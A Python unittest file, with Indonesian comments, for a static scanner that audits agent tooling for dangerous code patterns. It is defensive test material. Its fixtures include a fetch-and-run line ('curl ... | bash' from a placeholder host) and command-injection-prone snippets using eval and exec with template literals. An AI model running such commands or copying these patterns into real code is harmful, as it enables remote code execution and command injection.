"""Test F48 — agent-tooling safety audit (statis, NOL request).

Yang dikunci:
  - pola berbahaya spesifik terdeteksi: exec-template-literal, eval,
    shell:true, Math.random dekat token, curl|bash di installer;
  - anti-FP: baris komentar tidak dipindai; file test bukan permukaan;
  - kode bersih = satu baris AMAN; repo tidak ada = exit 2 fail-closed;
  - kontrak (rows, meta), semua baris valid.
"""
from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tools"))
sys.path.insert(0, str(ROOT / "core"))

import agent_tool_audit as ata  # noqa: E402
from findings import validate_finding  # noqa: E402


def _mk(td: Path, files: dict[str, str]) -> Path:
    for rel, content in files.items():
        f = td / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(content, encoding="utf-8")
    return td


class PatternTest(unittest.TestCase):
    def test_exec_template_literal_detected(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {"src/a.ts":
                                'exec(`ls ${userPath}`);\n'})
            rows, meta = ata.audit_codebase(td)
        self.assertEqual(meta["findings"], 1)
        self.assertEqual(rows[0]["cwe"], "CWE-78")
        self.assertEqual(rows[0]["pattern"], "exec-template-literal")

    def test_eval_and_shell_true_detected(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {
                "src/a.js": "eval(userInput);\n",
                "src/b.ts": "spawn(cmd, args, { shell: true });\n"})
            rows, meta = ata.audit_codebase(td)
        patterns = {r["pattern"] for r in rows}
        self.assertEqual(patterns, {"eval", "shell-true"})

    def test_mathrandom_near_token_detected(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {"src/tok.ts":
                                "const capability = Math.random();\n"
                                "// capability token for session\n"})
            rows, meta = ata.audit_codebase(td)
        self.assertEqual(rows[0]["cwe"], "CWE-338")

    def test_curl_pipe_shell_with_guard_flag(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {"install.sh":
                                "curl https://x.example/i.sh | bash\n"})
            rows, meta = ata.audit_codebase(td)
        self.assertEqual(rows[0]["pattern"], "curl-pipe-shell")
        self.assertFalse(rows[0]["guard_hint"])

    def test_clean_code_single_aman(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {"src/ok.ts":
                                'const p = path.join(root, name);\n'
                                'execFile(cmd, [p]);\n'})
            rows, meta = ata.audit_codebase(td)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["verdict"], 0)
        self.assertTrue(all(validate_finding(r) == [] for r in rows))


class AntiFalsePositiveTest(unittest.TestCase):
    def test_comment_lines_never_match(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {"src/doc.ts":
                                "// eval(userInput) contoh di komentar\n"
                                "/* spawn(`x ${y}`) juga komentar */\n"})
            rows, meta = ata.audit_codebase(td)
        self.assertEqual(meta["findings"], 0)

    def test_test_files_not_scanned(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {
                "src/a.test.ts": "eval('x');\n",
                "tests/b.ts": "eval('y');\n",
                "src/real.ts": "const ok = 1;\n"})
            rows, meta = ata.audit_codebase(td)
        self.assertEqual(meta["files_checked"], 1)
        self.assertEqual(meta["findings"], 0)

    def test_node_modules_skipped(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {
                "node_modules/pkg/index.js": "eval('x');\n",
                "src/real.ts": "const ok = 1;\n"})
            rows, meta = ata.audit_codebase(td)
        self.assertEqual(meta["files_checked"], 1)

    def test_mathrandom_alone_is_not_a_finding(self):
        with tempfile.TemporaryDirectory() as td:
            td = _mk(Path(td), {"src/j.ts":
                                "await sleep(jitter * Math.random());\n"})
            rows, meta = ata.audit_codebase(td)
        self.assertEqual(meta["findings"], 0)


class FailClosedTest(unittest.TestCase):
    def test_missing_repo_returns_error_meta(self):
        rows, meta = ata.audit_codebase(Path("Z:/tidak/ada"))
        self.assertEqual(rows, [])
        self.assertIn("error", meta)

    def test_main_missing_repo_exit_2(self):
        with tempfile.TemporaryDirectory() as td:
            rc = ata.main.__wrapped__ if False else None
        import subprocess
        r = subprocess.run(
            [sys.executable, str(ROOT / "tools" / "agent_tool_audit.py"),
             "--repo", "Z:/tidak/ada", "--out",
             str(Path(td) / "x.json")], capture_output=True, text=True)
        self.assertEqual(r.returncode, 2)


if __name__ == "__main__":
    unittest.main()
